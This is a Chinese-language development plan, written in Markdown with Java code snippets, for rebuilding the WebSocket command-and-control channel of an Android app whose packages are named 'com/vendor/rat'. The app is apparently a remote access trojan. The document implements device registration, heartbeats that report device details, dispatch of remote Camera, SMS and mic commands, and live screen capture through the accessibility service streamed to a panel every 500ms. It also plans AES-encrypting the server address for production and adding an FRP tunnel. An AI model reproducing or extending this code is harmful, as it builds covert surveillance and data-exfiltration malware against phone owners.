# MODULE_01 WebSocket 网络通信修复计划

> 目标: 让 Replica APK 的 WebSocketClient 连接到 Laravel Swoole WebSocket 服务
> 协议参考: [WEBSOCKET_PROTOCOL.md](../migration/WEBSOCKET_PROTOCOL.md)
> 日期: 2026-03-19
> 状态: ✅ 全部 6 Phase 已实施，编译通过，测试通过

---

## 1. 现状分析

### 1.1 修复前问题

| 问题 | 文件 | 说明 | 状态 |
|------|------|------|------|
| wsUrl 为 null | `config.json` | 无 `webSocketUrl` 字段 | ✅ 已修复 |
| ConfigDecryptor 未读取 wsUrl | `ConfigDecryptor.java` | 不解析 webSocketUrl | ✅ 已修复 |
| 消息格式不匹配 | `WebSocketClient.java` | 使用 `{type:0/1}` 格式 | ✅ 已重写 |
| connect() 从未调用 | `NetworkManager.java` | init() 创建实例但不启动 | ✅ 已修复 |
| 无命令接收能力 | `WebSocketClient.java` | onMessage 只透传字符串 | ✅ 已修复 |
| 心跳格式错误 | `WebSocketClient.java` | sendStatus 与 Laravel 不兼容 | ✅ 已修复 |
| CommandListener 冲突 | `CommandHandler.java` | 两个类争抢唯一 listener | ✅ 已修复 |
| reconnect 线程泄漏 | `WebSocketClient.java` | 每次重连 new Thread | ✅ 已修复 |

### 1.2 Laravel Swoole WebSocket 协议

完整协议见 [WEBSOCKET_PROTOCOL.md](../migration/WEBSOCKET_PROTOCOL.md)，核心要点:

**路由** (`MessageRouter.php`):
```
itype = "Slr_client"    → DeviceHandler   (设备端)
itype = "slr_panel"     → PanelHandler    (面板监控)
itype = "slr_panelsend" → PanelSendHandler (面板→设备控制)
```

**设备注册**: 首条带 `itype: "Slr_client"` + `pid` 的消息即触发 `registerDevice(fd, phoneId)`

**心跳**: `subc: "ping"` + `msg: URL-encoded 设备状态参数`

**数据上报**: 10 种 subc 类型，每种有不同的字段结构 (详见协议文档 §3)

**服务端下发**: `type: "screencomd"` + `subc` 为主，另有 `mic/Activitys/Permissions/Delete/Notifi/screen/brows/proxy/bc` 等类型 (详见协议文档 §4)

---

## 2. 修复方案 (6 个 Phase) — 全部已实施

### Phase 1: 配置层 ✅

**目标**: 让 Replica 能读取到 WebSocket 服务器地址

| 文件 | 修改 |
|------|------|
| `config.json` | 添加 `"webSocketUrl": "ws://192.168.31.35:8081"` |
| `ConfigDecryptor.java` | 添加 webSocketUrl 读取，支持明文 (ws/wss 开头) 或 AES 加密 |
| `AppConfig.java` | 已有 webSocketUrl 字段，无需修改 |

**ConfigDecryptor 解密逻辑**:
```java
if (wsRaw.startsWith("ws://") || wsRaw.startsWith("wss://")) {
    config.setWebSocketUrl(wsRaw);        // 明文直接用
} else {
    config.setWebSocketUrl(decryptValue(wsRaw));  // AES 解密
}
```

---

### Phase 2: 协议层 ✅

**目标**: WebSocketClient 完全适配 Laravel `itype/subc/pid` 协议

**文件**: `WebSocketClient.java` — 完整重写

#### 协议常量

```java
public static final String ITYPE_DEVICE = "Slr_client";
public static final String SUBC_PING    = "ping";
public static final String SUBC_CAM     = "cam";
public static final String SUBC_MIC     = "mic";
public static final String SUBC_THUMB   = "thumb";
public static final String SUBC_DOWN    = "down";
public static final String SUBC_SRCH    = "srch";
public static final String SUBC_PROXY   = "proxy";
```

#### 基础消息构建 (DRY)

```java
private JsonObject newBaseMessage(String subc) {
    JsonObject msg = new JsonObject();
    msg.addProperty("itype", ITYPE_DEVICE);
    msg.addProperty("subc", subc);
    msg.addProperty("pid", deviceId);
    return msg;
}
```

#### 10 个发送方法 (对齐协议文档 §3)

| 方法 | subc | 特殊字段 | 协议文档章节 |
|------|------|---------|------------|
| `sendPing(status)` | `ping` | `msg` (URL-encoded) | §3.1 |
| `sendData(subc, data)` | 动态 | `msg` | §3.2 |
| `sendScreen(subc, img, w, h)` | `screen`/`screenshot` | `img`, `wmob`, `hmob` | §3.4 |
| `sendCamera(img)` | `cam` | `img` | §3.5 |
| `sendMic(audio)` | `mic` | `voip` | §3.6 |
| `sendThumb(data, path)` | `thumb` | `msg`, `pth` | §3.7 |
| `sendFileChunk(...)` | `down` | 7 个字段 | §3.8 |
| `sendSearchResult(paths, type)` | `srch` | `pths`, `stype` | §3.9 |
| `sendProxy(ctype, extra)` | `proxy` | `ctype` + 动态字段 | §3.10 |

#### onOpen() — 首条 ping 即注册

```java
@Override
public void onOpen(WebSocket ws, Response response) {
    connected.set(true);
    String status = initialStatusParams != null ? initialStatusParams : "";
    sendPing(status);  // 首条消息即完成设备注册
}
```

#### onMessage() — 解析 JSON 分发

```java
@Override
public void onMessage(WebSocket ws, String text) {
    JsonObject json = gson.fromJson(text, JsonObject.class);
    String type = json.has("type") ? json.get("type").getAsString() : null;
    String subc = json.has("subc") ? json.get("subc").getAsString() : null;
    if ("pong".equals(type)) return;  // 忽略心跳响应
    commandListener.onCommand(type, subc, json);
}
```

#### CommandListener 接口

```java
public interface CommandListener {
    void onCommand(String type, String subc, JsonObject payload);
}
```

#### 重连 (ScheduledExecutorService)

```java
private final ScheduledExecutorService reconnectExecutor =
    Executors.newSingleThreadScheduledExecutor();

public void reconnect() {
    long delay = Math.min(BASE_RECONNECT_DELAY * (long) Math.pow(2, reconnectAttempts), 60000L);
    reconnectAttempts++;
    reconnectExecutor.schedule(this::connect, delay, TimeUnit.MILLISECONDS);
}
```

---

### Phase 3: 连接管理 ✅

**目标**: NetworkManager 添加 WebSocket 便捷方法，对齐 vendor 懒启动模式

**文件**: `NetworkManager.java`

```java
// init() 中不调用 connect()，由 KeepHeartThread 懒启动
wsClient = new WebSocketClient(wsUrl, deviceId);

// 新增便捷方法
public void connectWebSocket()           // KeepHeartThread 调用
public boolean isWebSocketConnected()    // 状态查询
public void sendToServer(subc, data)     // 通用数据上报
public void sendScreenToServer(subc, img, w, h)  // 屏幕上报
```

---

### Phase 4: 心跳集成 ✅

**目标**: KeepHeartThread 每次 tick 发送 Laravel 格式心跳

**文件**: `KeepHeartThread.java`

#### run() 中新增

```java
checkAndConnectWebSocket();  // 未连接则懒启动
sendWebSocketPing();         // 发送 URL-encoded 设备状态
```

#### buildStatusParams() — 对齐协议文档 §3.1

```java
private String buildStatusParams() {
    StringBuilder sb = new StringBuilder();
    sb.append("phone_name=").append(encode(getPhoneName()));  // Build.DEVICE
    sb.append("&model=").append(encode(Build.MODEL));
    sb.append("&android_version=").append(encode(Build.VERSION.RELEASE));
    sb.append("&battery_charge=").append(encode(getBatteryLevel()));
    sb.append("&accessibility=").append(isAccessibilityEnabled() ? "1" : "0");
    sb.append("&country=").append(encode(getCountryCode()));
    return sb.toString();
}
```

**字段映射** (Android → Laravel → DB):

| Android 参数 | Laravel 字段 | DB 列 | 说明 |
|-------------|-------------|-------|------|
| `phone_name` | `phone_name` | `devices.name` | 设备名称 (Build.DEVICE) |
| `model` | `model` | `devices.model` | 设备型号 (Build.MODEL) |
| `android_version` | `android_version` | `devices.android_version` | Android 版本 |
| `battery_charge` | `battery_charge` | `devices.battery_level` | 电池电量 |
| `accessibility` | `accessibility` | `devices.has_accessibility` | 无障碍服务 |
| `country` | `country` | `devices.country` | 国家代码 |
| `user_email` | `user_email` | — | 设备归属认证 (`email\|\|hmac.buildId.timestamp`) ✅ |
| `install_date` | `install_date` | `devices.installed_at` | 安装日期 (PackageManager.firstInstallTime) ✅ |
| `ip` | `ip` | `devices.ip_address` | 服务端自动获取 |

---

### Phase 5: 命令分发 ✅

**目标**: 接收服务端下发的控制命令，统一分发

**架构**: CommandDispatcher 是唯一的 WebSocket CommandListener，内部委托

```
WebSocketClient.onMessage()
  → CommandDispatcher.onCommand(type, subc, json)    ← 唯一 listener
      ├─ type="screencomd" → dispatchScreenCommand()  (协议文档 §4.1)
      │   ├─ subc="Screen"      → screenshotHandler
      │   ├─ subc="Camera"      → TODO
      │   ├─ subc="SMS"         → TODO
      │   └─ ... (30+ 命令)
      ├─ type=数字 (10-14)  → 旧格式兼容 (本地 HttpCommandServer)
      ├─ type="engine" / cmd字段 → engineHandler (CommandHandler 委托)
      └─ type="mic/Activitys/Permissions/Delete/Notifi" → TODO (协议文档 §4.2-4.5)
```

**修改的文件**:
- `CommandDispatcher.java` — 适配新接口，添加 screencomd 分发 + engineHandler 委托
- `CommandHandler.java` — 移除 CommandListener 实现，不再直接注册为 listener

---

### Phase 6: 编译验证 ✅

```bash
./gradlew compileDebugJavaWithJavac  # BUILD SUCCESSFUL
./gradlew test                        # BUILD SUCCESSFUL, 全部测试通过
```

---

## 3. 额外修复 (Simplify + Clean Code 审查)

实施后经过两轮代码审查，额外修复:

| 问题 | 修复 | 原则 |
|------|------|------|
| 9 个 send* 方法重复 itype/subc/pid | 提取 `newBaseMessage(subc)` | DRY |
| reconnect() 每次 new Thread | 改用 `ScheduledExecutorService` | 资源管理 |
| CommandHandler 和 CommandDispatcher 争抢 listener | CommandDispatcher 为唯一入口，委托 CommandHandler | SRP |
| ScreenBroadcastReceiver 重复 getInstance() | 缓存引用 | TOCTOU |
| CommandHandler.dispatchByCmd 缩进错误 | 修复缩进 | 代码风格 |
| 6 个硬编码 subc 字符串 | 提取为 SUBC_* 常量 | 可搜索性 |
| CommandDispatcher 未使用的 Gson 字段 | 移除 | YAGNI |
| phone_name 和 model 都用 Build.MODEL | phone_name 改用 `getPhoneName()` (Build.DEVICE) | 正确性 |

---

## 4. 最终修改文件清单

| Phase | 文件 | 操作 |
|-------|------|------|
| 1 | `android/app/src/main/assets/config.json` | 修改: 添加 webSocketUrl |
| 1 | `com/vendor/rat/config/ConfigDecryptor.java` | 修改: 读取 webSocketUrl |
| 2 | `com/vendor/rat/network/WebSocketClient.java` | 重写: 协议格式 + 10 个发送方法 + 常量 |
| 3 | `com/vendor/rat/network/NetworkManager.java` | 修改: 4 个便捷方法 |
| 4 | `com/vendor/rat/keepalive/thread/KeepHeartThread.java` | 修改: WS 连接管理 + 心跳 |
| 5 | `com/vendor/rat/control/handler/CommandDispatcher.java` | 修改: 新接口 + screencomd 分发 |
| 5 | `com/vendor/rat/service/CommandHandler.java` | 修改: 移除 listener，改为委托 |
| — | `com/vendor/rat/keepalive/receiver/ScreenBroadcastReceiver.java` | 修改: sendStatus→sendPing + 缓存引用 |

## 5. 不在本次范围

| 排除项 | 原因 | 后续计划 |
|--------|------|---------|
| FRP 内网穿透 (libfrpc.so) | Native 层，需 Go 编译 | 独立任务 |
| 各 screencomd 命令具体实现 | 属于 MODULE_04/05/06 | 逐模块实施 |
| PanelHandler screen/brows/proxy/bc 命令处理 | 需要投屏/浏览器/代理模块 | 逐模块实施 |
| Laravel 服务端修改 | 不需要，Replica 适配现有协议 | — |

## 6. 风险与注意事项

1. **WebSocket URL**: 开发用明文 `ws://192.168.31.35:8081`，生产需 AES 加密
2. **大消息分块**: 屏幕截图 base64 可能超过 Swoole `websocket_max_frame_size`，需确认服务端配置
3. **重连策略**: 指数退避 3s→6s→12s→...→60s，10 次后重置计数器
4. **OkHttp pingInterval**: 30s，与 Laravel heartbeatTimeout=75s 兼容
5. **异步连接**: KeepHeartThread 首次 tick 调用 connect() 后，ping 在下次 tick 才发送（connect 是异步的）

---

## 7. 后续实施 (FIX-12 ~ FIX-17)

### FIX-12: user_email 认证 ✅ 已实施

- `config.json` 添加 `userEmail` + `deviceAuthSecret`
- `AppConfig.java` 添加 `userEmail` / `deviceAuthSecret` 字段
- `ConfigDecryptor.java` 读取 userEmail (明文含@直接用) + deviceAuthSecret
- `KeepHeartThread.getUserEmail()` 生成 `email||hmac.buildId.timestamp` 格式 token
- HMAC 算法: `HmacSHA256(email|buildId|timestamp, secret)` — 对齐 Laravel `DeviceTokenService`
- 真机验证: 设备认证通过，自动注册到用户 ✅

### FIX-13: install_date 心跳字段 ✅ 已实施

- `KeepHeartThread.getInstallDate()` 通过 `PackageManager.getPackageInfo().firstInstallTime` 获取
- 格式: `yyyy-MM-dd HH:mm:ss`
- 缓存: `cachedInstallDate` 只查一次，安装日期不变

### FIX-14: 真实电池电量 ✅ 已实施

- `KeepHeartThread.getBatteryLevel()` 通过 sticky broadcast `ACTION_BATTERY_CHANGED` 获取
- 计算: `level / scale * 100` → `"65%"`

### FIX-15: HeartThread 重复心跳 ✅ 已修复

- `KeepAliveManager.init()` 不再启动 HeartThread
- 心跳统一由 KeepHeartThread 处理，避免重复空 ping

### FIX-16: CommandDispatcher 注册 ✅ 已修复

- `MainApplication.initNetwork()` 中创建 CommandDispatcher 并调用 `register()`
- 确保 WebSocket 命令能被接收和分发

### FIX-17: 实时投屏 ✅ 已实施

- `ScreenshotHandler.java` 完整重写
  - SN → `subc: "screen"` (投屏/OCR)
  - SM → `subc: "screenshot"` (截图/ScreenViewer)
  - 每 500ms 通过 `AccessibilityService.takeScreenshot()` (API 30+) 截屏
  - Bitmap → scale 0.5x → JPEG q=30 → Base64 → WebSocket 上报
  - `wmob`/`hmob` 作为 Number 类型发送
- `MyAccessibilityService.java` 添加 `takeScreenshotAsync()` 方法
- `Control.vue` 合并 `case 'screen'` 和 `case 'screenshot'` 更新 ScreenViewer
- 真机验证: Panel 实时投屏画面显示 ✅

### 最终修改文件清单 (含 FIX-12 ~ FIX-17)

| FIX | 文件 | 操作 |
|-----|------|------|
| 12 | `config.json` | 添加 userEmail + deviceAuthSecret |
| 12 | `AppConfig.java` | 添加 userEmail / deviceAuthSecret 字段 |
| 12 | `ConfigDecryptor.java` | 读取 userEmail + deviceAuthSecret |
| 12,13,14 | `KeepHeartThread.java` | getUserEmail (HMAC) + getInstallDate + getBatteryLevel |
| 15 | `KeepAliveManager.java` | 禁用 HeartThread |
| 15 | `HeartThread.java` | sendHeartbeat 改用 sendPing (备用) |
| 16 | `MainApplication.java` | initNetwork 注册 CommandDispatcher |
| 17 | `ScreenshotHandler.java` | 完整重写: SN/SM 区分 + 定时截屏 |
| 17 | `MyAccessibilityService.java` | 添加 takeScreenshotAsync |
| 17 | `WebSocketClient.java` | wmob/hmob 改为 Number 类型 |
| 17 | `Control.vue` | screen/screenshot 合并更新 ScreenViewer |
